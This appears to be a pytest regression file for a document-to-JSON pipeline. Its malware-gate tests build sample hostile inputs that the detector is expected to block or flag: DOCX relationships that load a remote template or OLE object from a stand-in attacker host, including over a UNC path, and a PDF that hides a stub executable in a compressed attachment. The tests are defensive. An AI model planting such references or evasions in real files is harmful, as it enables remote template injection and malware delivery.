"""Regression tests for the issues found in the final code review."""

import zipfile

import fitz
import pytest

from report_to_json import backends, config, convert
from report_to_json.images import offload_images
from report_to_json.security import MalwareDetectedError, malware_gate, scan_file
from report_to_json.security import ooxml
from report_to_json.storage import LocalDeepStorage

from conftest import make_docx, make_image_bytes, page_text_layer
from test_pipeline import perfect_model, run


# --- malware gate ------------------------------------------------------------------------------

@pytest.mark.parametrize("rels", [
    "<Relationships><Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/"
    "relationships/attachedTemplate' Target='http://attacker.test/t.dotm' TargetMode='External'/></Relationships>",
    '<pr:Relationships xmlns:pr="x"><pr:Relationship Id="rId1" TargetMode = "External" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
    'Target="\\\\attacker.test\\share\\x.bin"/></pr:Relationships>',
])
def test_remote_template_in_any_attribute_style_is_blocked(tmp_path, rels):
    path = make_docx(tmp_path / "t.docx", {"word/_rels/settings.xml.rels": rels})
    assert ooxml.inspect_ooxml(str(path))["external_ref"] == "FOUND"
    with pytest.raises(MalwareDetectedError):
        malware_gate(path)


def test_unreadable_archive_member_blocks_instead_of_crashing(tmp_path, monkeypatch):
    path = make_docx(tmp_path / "enc.docx", {})

    def encrypted(_path):
        yield "word/document.xml", b"<w:document/>"
        raise RuntimeError("File <ZipInfo> is encrypted, password required for extraction")

    monkeypatch.setattr(ooxml, "iter_members", encrypted)
    assert ooxml.inspect_ooxml(str(path))["recommendation"] == "BLOCK"
    with pytest.raises(MalwareDetectedError):
        malware_gate(path)


def test_executable_in_annotation_attachment_is_malicious(tmp_path):
    path = tmp_path / "annot.pdf"
    doc = fitz.open()
    doc.new_page().add_file_annot(fitz.Point(50, 50), b"MZ" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 64, "a.exe")
    doc.save(str(path), garbage=3, deflate=True)
    doc.close()
    assert b"MZ" not in path.read_bytes()  # hidden from a raw-bytes scan by compression
    assert scan_file(path)["verdict"] == "MALICIOUS"


def test_zip_with_real_encrypted_flag_is_handled(tmp_path):
    # A member flagged as encrypted (bit 0) makes zipfile raise RuntimeError on read.
    path = tmp_path / "flag.docx"
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
    data = bytearray(path.read_bytes())
    for header in (b"PK\x03\x04", b"PK\x01\x02"):
        at = data.find(header)
        flag_offset = at + (6 if header == b"PK\x03\x04" else 8)
        data[flag_offset] |= 0x01
    path.write_bytes(bytes(data))
    assert ooxml.inspect_ooxml(str(path))["recommendation"] == "BLOCK"


# --- backends ---------------------------------------------------------------------------------

def test_model_load_failure_is_a_backend_error_and_not_retried(tmp_path, monkeypatch):
    (tmp_path / "config.json").write_text("{}")
    backend = backends.TransformersBackend(config.get_model("qwen3-vl-4b-instruct-awq"), tmp_path)
    calls = []

    def fail():
        calls.append(1)
        raise OSError("processor files missing")

    monkeypatch.setattr(backend, "_load_model", fail)
    with pytest.raises(backends.BackendError, match="processor files missing"):
        backend.check()
    with pytest.raises(backends.BackendError):
        backend.generate("p")
    assert calls == [1]


def test_non_json_server_reply_is_a_backend_error(monkeypatch):
    class Reply:
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def read(self):
            return b"<html>502 Bad Gateway</html>"

    monkeypatch.setattr(backends.urllib.request, "urlopen", lambda req, timeout=None: Reply())
    with pytest.raises(backends.BackendError, match="did not return JSON"):
        backends.OpenAICompatBackend(config.get_model("qwen3-vl-4b-instruct-awq"), "http://h/v1").generate("p")


# --- conversion ------------------------------------------------------------------------------

def test_stale_pdf_is_never_reused(tmp_path, monkeypatch):
    out = tmp_path / "converted"
    out.mkdir()
    (out / "report.pdf").write_bytes(b"%PDF-1.7 from an earlier run")
    monkeypatch.setattr(convert, "available_converter", lambda: "libreoffice")
    monkeypatch.setattr(convert, "_soffice", lambda: "soffice")
    monkeypatch.setattr(convert, "_run", lambda cmd, cwd: None)  # exits 0 but writes nothing
    with pytest.raises(convert.ConversionError, match="produced no PDF"):
        convert.docx_to_pdf(tmp_path / "report.docx", out)


# --- image offload ----------------------------------------------------------------------------

def test_images_listed_but_not_drawn_are_not_tagged(tmp_path):
    path = tmp_path / "shared.pdf"
    doc = fitz.open()
    doc.new_page().insert_image(fitz.Rect(50, 50, 250, 200), stream=make_image_bytes((200, 150)))
    doc.new_page().insert_text((50, 60), "No image on this page")
    # Share page 1's resources with page 2, as some generators do: page 2 lists the image but never draws it.
    doc.xref_set_key(doc[1].xref, "Resources", doc.xref_get_key(doc[0].xref, "Resources")[1])
    doc.save(str(path))
    doc.close()
    with fitz.open(str(path)) as check:
        assert check[1].get_images()  # listed on page 2
    figures = offload_images(str(path), LocalDeepStorage(tmp_path / "s")).figures
    assert list(figures) == [1] and len(figures[1]) == 1


# --- pass 1 report ----------------------------------------------------------------------------

def test_page_report_lists_words_missing_from_the_kept_attempt(report_pdf, tmp_path):
    full = page_text_layer(report_pdf, 2)
    replies = iter([full.split("Impact:")[0], full[:40], full[:40]])  # best first, then worse
    result = run(report_pdf, tmp_path, perfect_model(report_pdf, {"transcribe page 2 of 3": lambda p: next(replies)}))
    page = result.meta["pass1_pages"][1]
    issue = next(i for i in page["issues"] if "below" in i)
    assert "broken" not in issue and "authentication" not in issue  # present in the kept attempt
    assert "unencrypted" in issue or "impact" in issue
